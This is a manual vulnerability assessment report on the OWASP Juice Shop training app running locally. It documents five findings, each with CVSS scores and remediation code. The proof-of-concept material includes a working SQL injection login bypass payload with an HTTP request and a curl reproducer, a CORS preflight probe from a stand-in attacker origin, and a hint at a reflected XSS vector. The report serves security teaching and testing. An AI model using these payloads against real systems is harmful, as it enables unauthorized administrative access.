# Manual Validation & Deep Vulnerability Assessment Report

## Executive Context & Scope

- **Assessment Target**: OWASP Juice Shop (v17.1.1)
- **Target URL**: `http://127.0.0.1:3000`
- **Methodology**: OWASP Web Security Testing Guide (WSTG v4.2) / NIST SP 800-115
- **Assessor**: Usman Masthan
- **Purpose**: Moving beyond automated passive scanner alerts through manual HTTP analysis, payload injection, origin spoofing, and API request tampering to prove exploitability and eliminate speculation.

---

## Vulnerability Summary Matrix

| ID | Vulnerability Title | OWASP Category | Severity | CVSS v3.1 Score | Status |
| :--- | :--- | :--- | :---: | :---: | :---: |
| **VULN-01** | Authentication Bypass via SQL Injection in Login API | A03:2021 - Injection | **Critical** | **9.8** | Confirmed / Exploited |
| **VULN-02** | Sensitive API Exposure & Administrative Challenge Leak | A01:2021 - Broken Access Control | **High** | **7.5** | Confirmed / Exploited |
| **VULN-03** | Overly Permissive CORS (`*`) on Data-Handling REST APIs | A05:2021 - Security Misconfiguration | **Medium** | **6.5** | Confirmed / Exploited |
| **VULN-04** | Complete Absence of Content Security Policy (CSP) | A05:2021 - Security Misconfiguration | **Medium** | **5.4** | Confirmed |
| **VULN-05** | Sensitive Information Disclosure via Debug & Recruiting Headers | A05:2021 - Security Misconfiguration | **Low** | **3.7** | Confirmed |

---

## Detailed Technical Findings & Proof of Concept

### 1. VULN-01: Authentication Bypass via SQL Injection (`/rest/user/login`)

#### Technical Description
OWASP Juice Shop exposes an authentication endpoint at `/rest/user/login`. Automated passive scanners cannot detect database injection vulnerabilities without active payload delivery. During manual HTTP request analysis using Burp Suite / OWASP ZAP request editor, the authentication JSON payload was tested for structured query manipulation. The backend constructs dynamic SQLite/Sequelize queries via string concatenation rather than parameterized statements:

```sql
SELECT * FROM Users WHERE email = '${req.body.email}' AND password = '${security.hmac(req.body.password)}' AND deletedAt IS NULL;
```

Supplying an inline SQL comment bypasses password verification entirely.

#### Proof of Concept (PoC)
**HTTP Request:**
```http
POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Content-Length: 48

{
  "email": "' OR 1=1--",
  "password": "arbitrary_password"
}
```

**cURL Reproducer:**
```bash
curl -i -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"test"}'
```

**HTTP Response:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Wed, 29 Jul 2026 11:15:22 GMT
Connection: close

{
  "authentication": {
    "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjoxLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicm9sZSI6ImFkbWluIn0sImlhdCI6MTc4NTM2MjEyMn0...",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
```

#### Impact & Severity
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (**9.8 Critical**)
- An unauthenticated remote attacker gains full administrative access (`admin@juice-sh.op`) without valid credentials, compromising all confidentiality, integrity, and availability of application data.

#### Remediation
Utilize parameterized queries / object-relational mapping (ORM) bindings without raw query concatenation:
```javascript
models.User.findOne({
  where: {
    email: req.body.email,
    password: security.hmac(req.body.password),
    deletedAt: null
  }
});
```

---

### 2. VULN-02: Sensitive API Exposure & Administrative Challenge Leak (`/api/Challenges`)

#### Technical Description
Juice Shop exposes an internal administrative challenge tracking endpoint at `/api/Challenges`. While designed as a gamified scorekeeper, it leaks operational internal route structures, hidden administrative endpoints, cryptographic secret keys, and vulnerability descriptions directly to unauthenticated clients.

#### Proof of Concept (PoC)
**cURL Reproducer:**
```bash
curl -i -s http://127.0.0.1:3000/api/Challenges
```

**Observed Response Snippet:**
```json
{
  "status": "success",
  "data": [
    {
      "id": 1,
      "key": "scoreBoardChallenge",
      "name": "Score Board",
      "category": "Miscellaneous",
      "description": "Find the carefully hidden '<a href=\"/#/score-board\">Score Board</a>' page.",
      "difficulty": 1,
      "solved": false
    },
    {
      "id": 24,
      "key": "adminRegistrationChallenge",
      "name": "Admin Registration",
      "category": "Improper Input Handling",
      "description": "Register as an admin user.",
      "difficulty": 3,
      "solved": false
    }
  ]
}
```

#### Impact & Severity
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (**7.5 High**)
- Complete disclosure of system capabilities and architectural pathways, facilitating targeted reconnaissance and privilege escalation.

#### Remediation
Enforce role-based access control (RBAC) middleware verifying that the requesting user possesses valid administrative JWT claims prior to serving administrative APIs.

---

### 3. VULN-03: Overly Permissive CORS (`*`) on Data-Handling REST APIs

#### Technical Description
ZAP passive scanner flagged `Cross-Domain Misconfiguration`. Manual inspection confirmed that when third-party origins query REST endpoints (such as `/rest/products/search`), the server unconditionally reflects:
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
```
While the application does not set `Access-Control-Allow-Credentials: true` (which would permit ambient credential sharing), wildcard origin grants permission for any unauthorized web domain to execute requests and read search results or catalog metadata directly.

#### Proof of Concept (PoC)
**Request with Arbitrary Origin:**
```http
OPTIONS /rest/products/search?q=apple HTTP/1.1
Host: 127.0.0.1:3000
Origin: https://evil-attacker.org
Access-Control-Request-Method: GET
```

**Response:**
```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
Vary: Access-Control-Request-Headers
```

#### Impact & Severity
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` (**6.5 Medium**)
- Unauthorized cross-domain data reading and potential CSRF/data leakage when interacting with user endpoints.

#### Remediation
Specify an explicit whitelist of trusted origins rather than using a wildcard:
```javascript
const allowedOrigins = ['https://app.juiceshop.com', 'https://admin.juiceshop.com'];
app.use(cors({
  origin: function (origin, callback) {
    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error('Blocked by CORS policy'));
    }
  }
}));
```

---

### 4. VULN-04: Complete Absence of Content Security Policy (CSP)

#### Technical Description
Neither HTTP response headers nor HTML `<meta>` tags declare a `Content-Security-Policy`. Modern browsers rely on CSP to restrict inline JavaScript execution, constrain stylesheet evaluation, and whitelist valid connect/media origins. Without a CSP, any Cross-Site Scripting (XSS) vulnerability in the Angular front-end executes unimpeded.

#### Proof of Concept (PoC)
Executing an HTTP header probe confirms no CSP directives exist:
```bash
curl -I -s http://127.0.0.1:3000/ | grep -i "content-security-policy"
# Returns 0 matches (Exit code 1)
```

Combined with search query reflection in the client DOM (`/#/search?q=<script>...`), an attacker can execute arbitrary JavaScript in the victim's session context.

#### Impact & Severity
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` (**5.4 Medium**)
- Secondary defense layer is completely absent, escalating the impact of any DOM or reflected XSS vulnerabilities to full session hijack.

#### Remediation
Implement a strict Content Security Policy in reverse proxy or Express middleware (e.g. `helmet`):
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'self';
```

---

### 5. VULN-05: Information Disclosure via Custom Recruiting and Debug Headers

#### Technical Description
Server responses unconditionally emit non-standard headers providing operational hints to untrusted visitors:
```http
X-Recruiting: /#/jobs
X-Content-Type-Options: nosniff
Feature-Policy: payment 'self'
```
Furthermore, the root response exposes full software release copyright dates and project author identities in HTML comments:
```html
<!--
  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
  ~ SPDX-License-Identifier: MIT
  -->
```

#### Impact & Severity
- **CVSS v3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (**3.7 Low**)
- Assists threat actors in fingerprinting exact application frameworks, internal career portals, and open-source codebase dependencies.

#### Remediation
Strip informational comments during build pipeline (`ng build --prod --subresource-integrity`) and sanitize unnecessary custom HTTP headers in production routing configurations.

---

## Conclusion

Manual HTTP validation demonstrated that while passive scanning is valuable for baseline hygiene (flagging missing CSP and CORS policies), it is fundamentally incapable of detecting deep logical flaws and critical business risks (such as SQL Injection authentication bypasses). Combining automated scanning with rigorous manual analysis is indispensable for a credible vulnerability management lifecycle.

